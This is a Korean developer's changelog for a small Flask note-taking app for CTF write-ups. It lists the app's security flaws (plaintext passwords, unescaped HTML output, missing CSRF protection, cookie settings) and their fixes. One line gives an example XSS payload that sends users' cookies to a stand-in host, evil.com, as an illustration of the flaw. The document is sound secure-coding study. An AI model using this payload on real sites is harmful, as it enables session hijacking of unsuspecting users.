## v0.1.0 : 낱개 기능 구현

**구조**
├── app.py # 백엔드          
├── templates/
│    ├── login.html # 로그인 화면
│    ├── main.html # 추후 기본 리스트 화면 or 메인 화면 예정
│    ├── signup.html # 회원가입
│    └── Writeup # 노트 쓰기 부분          
│        └── note.html
└── README.md

## v0.1.1 : 구조 수정
*첫 데이터 베이스 (SQLite) 연결 완료*

**구조**
CTF_writeup
├── src/
│    ├── database.cpython-314 
│    └── database.py # 현재 데이터베이스(시퀄라이트)
├── static/ # 별 의미 없는 디렉터리. html 파일에 css 까지 합쳐둔게 눈에 거슬려 나중에 시간 될때 분류 할 예정 
│   └── css/ # 추후 정리 예정
├── templates/
│    ├── login.html
│    ├── signup.html
│    ├── main.html
│    └── Writeup/
│        └── note.html
├── .env # env 의 존재를 알았다!
└── .gitignore # 얘도 처음 알았음 .env 짝꿍임 ( api 키나 토큰 등 유출 방지로 필수)

* TODO
- SQLite -> MYSQL (희망사항이자 예정)
- Flask -> Node JS (희망사항)
- html, css + **JS** (필요해지면)


## v0.3.0 : 아키텍쳐 재설개.. 
*판도라의 상자를 열게 되다*

**구조**
CTF_Writeup
├── app/
│   ├── __init__.py              # Flask app factory + CSRFProtect, 세션 쿠키 설정
│   ├── config.py                # SECRET_KEY, DB 경로 (.env에서 로드)
│   │
│   ├── database.py              # ← 기존 database.py 이동
│   │                             #   - init_db() 함수로 감싸기
│   │                             #   - 해싱 적용 (register_user, check_login)
│   │
│   ├── routes/
│   │   ├── __init__.py
│   │   ├── auth.py               # ← app.py의 회원가입/로그인/로그아웃 라우트만 분리
│   │   └── notes.py              # ← app.py의 note/save_note/my_notes 라우트만 분리
│   │
│   ├── templates/
│   │   ├── signup.html           # ← 기존 signup.html 이동 (그대로 재사용 가능)
│   │   ├── login.html            # ← 기존 login.html 이동
│   │   ├── note.html             # ← 기존 note.html 이동
│   │   └── my_notes.html         # 신규: f-string 대신 Jinja 템플릿으로 (XSS 차단용)
│   │
│   └── static/
│       ├── css/
│       └── js/                    # JS 넣을 때 여기
│
├── .env                           # SECRET_KEY=... (절대 커밋 X)
├── .gitignore                     # 아래 내용 참고
├── requirements.txt                # flask, flask-wtf, werkzeug 등
└── run.py                          # from app import create_app; app.run()

* 레전드 비상사태 (나는 게임 처럼 서버 검증만 넣는다면 되는 줄 알았어.해시화 안 한 것만 문제 될 줄 알았지..)
- 비밀번호 평문 저장 (가장 심각)
-> database.py를 보면 pw 컬럼에 비밀번호를 그대로 저장하고 check_login도 평문 비교.
    주석에도 "실제로는 해싱해야 하지만 일단은 기본형으로"라고 써두긴 했음

- XSS — show_my_notes가 진짜 취약
-> 레전드 조짐 어카냐..
    note.html의 content textarea는 아무 제약 없이 자유 텍스트를 받고있고
    이게 save_note로 그대로 DB에 들어간 뒤 app.py에서 이스케이프 없이 f"<li>...</li>"로 HTML에 꽂힘
     즉:
     회원가입 (혹은 로그인 후) → 오답노트 작성 페이지에서 title에 <script>document.location='//evil.com/steal?c='+document.cookie</script> 입력
     /my_notes 방문한 다른 유저(또는 본인) 세션에서 그대로 실행

**해결방안** : note.html처럼 Jinja 템플릿을 만들어서 렌더링하세요. Jinja는 {{ }} 안의 값을 기본적으로 자동 이스케이프합니다.(클로드 뇌피셜, jinja 가 뭔지 모름 진자..?)

- CSRF 토큰 없음
-> login.html, signup.html, note.html의 폼 모두 CSRF 방어가 없음
    로그인된 상태에서 악성 페이지가 사용자 몰래 /save_note로 폼을 제출시킬 수 있는 상태임
    Flask-WTF의 CSRFProtect를 붙이는 게 제일 간단 할 예정

- 세션 쿠키 보안 옵션 미설정
-> HTTPONLY는 XSS가 하나 뚫려도 세션 쿠키까지 털리는 건 막아주는 최소한의 안전장치임 


### 클로드의 리뷰
- main.html: 내용이 height: 10000px 검은 박스 하나뿐이고 어떤 라우트에서도 참조 안 되는 파일이에요.
  테스트하다 남은 파일  같은데, 지워도 될 것 같아요.
- database.py의 모듈 최상단 코드: import database 하는 순간 DB 연결·테이블 생성이 바로 실행돼요. 
  지금은 문제없지만, 나중에 테스트 코드에서 이 모듈을 import만 해도 DB 파일이 생성되는 부작용이 생겨요. init_db() 함수로 감싸고 app.py에서 명시적으로 한 번 호출하는 걸 추천합니다.
- 매 함수마다 sqlite3.connect() 새로 열고 닫기: 지금 트래픽에선 문제없지만, 
  저번에 말씀드린 aiosqlite + WAL 모드로 넘어갈 때 이 패턴 자체를 connection pool 방식으로 바꾸시면 됩니다.
- database_cpython-314.pyc: 컴파일된 바이트코드 파일이 업로드되어 있던데, 
  이건 .gitignore에 __pycache__/, *.pyc 추가해서 저장소에 안 올라가게 하세요.

### 현재 웹 애플리케이션 보안 취약점 요약

| 용어 | 내 코드에서의 상황 | 보안 관점에서의 의미 |
| :--- | :--- | :--- |
| **평문 저장** | `pw` 컬럼에 비번이 그대로 들어감 | DB 유출 시 모든 유저 비밀번호가 그대로 노출되는 대참사 |
| **XSS**<br>(Cross-Site Scripting) | f-string `f"<li>{content}</li>"` 형태로 직접 출력 | 공격자가 입력한 악성 스크립트가 유저 브라우저에서 실행됨 |
| **CSRF**<br>(Cross-Site Request Forgery) | 폼(Form) 전송 시 아무런 검증 장치가 없음 | 다른 사이트(낚시 링크)를 보던 유저가 내 사이트에 강제로 글을 쓰게 만듦 |
| **HttpOnly 쿠키** | 세션 설정에 이 옵션이 빠져있음 | XSS 공격을 당했을 때 JavaScript(`document.cookie`)로 세션 토큰을 그대로 털림 |


## v0.3.1 : 시큐어 코드 업데이트 완료!


### 각 부분이 하는 일

- run.py: 앱 켜는 시작점. create_app() 호출만 함.

- app/__init__.py: 앱 조립 공장. CSRF 보호 켜고, DB 초기화하고, 라우트들 등록.

- config.py: .env에서 비밀값(SECRET_KEY 등) 읽어오는 역할.

- routes/auth.py, routes/notes.py: URL 하나당 함수 하나. "로그인해줘", "노트 저장해줘"
  같은 요청을 받아서  database.py 함수 호출하고 결과 돌려줌. 여기선 SQL을 직접 안 짬.

- database.py: 진짜 SQL이 사는 곳. 비밀번호 해싱/검증, 노트 저장/조회.

- templates/*.html: 화면. {{ }} 안에 값 넣으면 자동으로 XSS 이스케이프됨.
- session: 로그인하면 session['user_id']에 저장, 이후 요청마다 이 값으로 "누가 요청했는지" 확인.

### 지금까지 넣은 보안 장치 셋

- 해싱 (werkzeug.security) — 비밀번호 원문 저장 안 함
- Jinja 자동 이스케이프 — 노트 내용에 <script> 넣어도 실행 안 됨
- CSRF 토큰 — 남의 사이트에서 몰래 폼 제출 못 하게 막음

